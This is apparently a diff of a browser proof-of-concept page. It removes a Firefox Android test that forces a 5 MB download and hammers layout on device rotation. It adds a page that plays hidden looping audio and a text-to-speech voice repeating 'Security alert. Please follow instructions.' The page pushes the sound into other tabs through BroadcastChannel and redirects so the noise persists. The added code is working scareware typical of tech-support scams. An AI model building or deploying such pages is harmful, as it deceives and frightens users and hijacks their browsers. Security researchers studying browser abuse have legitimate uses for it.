@@ -1,131 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FF Android POC v3</title>
-  <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 10px; }
-    button { padding: 14px; font-size: 16px; width: 100%; margin: 4px 0; }
-    #log { font-size: 11px; border: 1px solid #0f0; padding: 8px; min-height: 120px; margin-top: 8px; max-height: 200px; overflow-y: auto; }
-    .heavy { height: 400vh; background: repeating-linear-gradient(45deg,#1a1a1a,#2a2a2a 8px); }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cross-Tab Persistent Audio + TTS</title>
 </head>
-<body>
-<h3>FF Android POC v3</h3>
-<button onclick="armPOC()">🔴 Arm POC</button>
-<button onclick="armControl()">⚪ Arm CONTROL (tanpa hammer)</button>
-<button onclick="resetAll()">🔁 Reset</button>
-<div id="log">Waiting...</div>
-<div class="heavy"></div>
+<body style="text-align:center; padding:50px; font-family:sans-serif; background:#000; color:#fff;">
+
+<h2>CLICK TO START AUDIO + TTS (Cross-Tab)</h2>
+<button id="startBtn" style="padding:15px 30px; font-size:18px; cursor:pointer;">Start</button>
 
 <script>
-let armed = false;
-let controlMode = false;
-let frameDrops = 0;
-let lastFrame = 0;
-let rafHandle = null;
+const btn = document.getElementById('startBtn');
+btn.addEventListener('click', async () => {
+  btn.disabled = true;
 
-const log = (m) => {
-  const d = document.getElementById('log');
-  d.innerHTML += `[${(performance.now()|0)}ms] ${m}<br>`;
-  d.scrollTop = d.scrollHeight;
-};
+  // 🔹 Broadcast channel untuk cross-tab
+  const bc = new BroadcastChannel('persistent-audio');
 
-// ===== Frame drop detector =====
-function startFrameMonitor() {
-  lastFrame = performance.now();
-  frameDrops = 0;
-  
-  function tick(now) {
-    const delta = now - lastFrame;
-    // Frame > 100ms = jank berat / freeze
-    if (delta > 100) {
-      frameDrops++;
-      log(`⚠️ FRAME DROP: ${delta.toFixed(0)}ms gap (total drops: ${frameDrops})`);
-    } else if (delta > 50) {
-      log(`⚡ Jank ringan: ${delta.toFixed(0)}ms`);
+  // 🎧 Audio utama (MediaStream / AudioContext)
+  let audio = document.getElementById('persistentAudio');
+  if (!audio) {
+    audio = document.createElement('audio');
+    audio.id = 'persistentAudio';
+    audio.src = 'windows.mp3'; // file audio
+    audio.loop = true;
+    audio.autoplay = false;
+    audio.style.display = 'none';
+    document.body.appendChild(audio);
+
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const source = audioCtx.createMediaElementSource(audio);
+    const gainNode = audioCtx.createGain();
+    gainNode.gain.value = 1; // full volume utama
+    source.connect(gainNode).connect(audioCtx.destination);
+
+    try {
+      await audio.play();
+      if (audioCtx.state === 'suspended') await audioCtx.resume();
+      console.log("[PoC] Main Audio playing");
+    } catch(e){ console.warn("Audio play failed", e); }
+  }
+
+  // 🔊 SpeechSynthesis loop
+  function speakLoop() {
+    const utter = new SpeechSynthesisUtterance("Security alert. Please follow instructions.");
+    utter.lang = 'en-US';
+    utter.volume = 0.2; // kecil supaya overlay
+
+    const voices = speechSynthesis.getVoices();
+    if (voices.length) {
+      const enVoice = voices.find(v => v.lang.startsWith('en'));
+      if (enVoice) utter.voice = enVoice;
     }
-    lastFrame = now;
-    rafHandle = requestAnimationFrame(tick);
-  }
-  rafHandle = requestAnimationFrame(tick);
-  log('[*] Frame monitor started');
-}
 
-function stopFrameMonitor() {
-  if (rafHandle) cancelAnimationFrame(rafHandle);
-  log(`[*] Frame monitor stopped — total drops: ${frameDrops}`);
-}
-
-// ===== Orientation listener =====
-window.addEventListener('orientationchange', () => {
-  const type = screen.orientation?.type ?? window.orientation;
-  log(`[!] orientationchange → ${type}`);
-  
-  if (!armed && !controlMode) return;
-  
-  if (controlMode) {
-    log('[CONTROL] Tidak ada hammer — hanya download');
-    triggerDownload();
-    return;
+    speechSynthesis.speak(utter);
+    utter.onend = () => speakLoop();
   }
-  
-  // Mode POC penuh
-  triggerDownload();
-  hammerLayout();
+  speakLoop();
+
+  // 🔀 Trigger cross-tab event
+  bc.postMessage({action:'start'});
+
+  // 🔹 Listener di tab lain
+  bc.onmessage = (event) => {
+    if (event.data.action === 'start') {
+      // Jika audio belum ada, buat baru
+      let otherAudio = document.getElementById('persistentAudio');
+      if (!otherAudio) {
+        const a = document.createElement('audio');
+        a.id = 'persistentAudio';
+        a.src = 'windows.mp3';
+        a.loop = true;
+        a.autoplay = true;
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.play().catch(()=>{});
+      }
+      // SpeechSynthesis loop juga bisa dipicu di tab baru
+      speakLoop();
+    }
+  };
+
+  // 🔀 Redirect setelah delay (audio tetap jalan di tab baru)
+  setTimeout(() => {
+    window.location.href = "https://www.google.com";
+  }, 5000);
 });
-
-// ===== Arm functions =====
-function armPOC() {
-  armed = true;
-  controlMode = false;
-  log('[+] ARMED (full POC) — rotate device sekarang');
-  startFrameMonitor();
-}
-
-function armControl() {
-  armed = false;
-  controlMode = true;
-  log('[+] CONTROL MODE — download saja tanpa hammer');
-  startFrameMonitor();
-}
-
-function resetAll() {
-  armed = false;
-  controlMode = false;
-  frameDrops = 0;
-  stopFrameMonitor();
-  document.getElementById('log').innerHTML = 'Reset. Waiting...<br>';
-}
-
-// ===== Download =====
-function triggerDownload() {
-  const buf = new Uint8Array(5 * 1024 * 1024).fill(65);
-  const blob = new Blob([buf], { type: 'application/octet-stream' });
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = 'poc.bin';
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-  setTimeout(() => URL.revokeObjectURL(url), 5000);
-  log('[+] Download 5MB triggered');
-}
-
-// ===== Layout hammer =====
-function hammerLayout() {
-  log('[*] Hammer started');
-  let i = 0;
-  const t = setInterval(() => {
-    void document.body.getBoundingClientRect();
-    document.documentElement.style.fontSize = (14 + (i % 2)) + 'px';
-    if (++i >= 60) {
-      clearInterval(t);
-      log('[*] Hammer selesai');
-    }
-  }, 16);
-}
 </script>
+
 </body>
 </html>
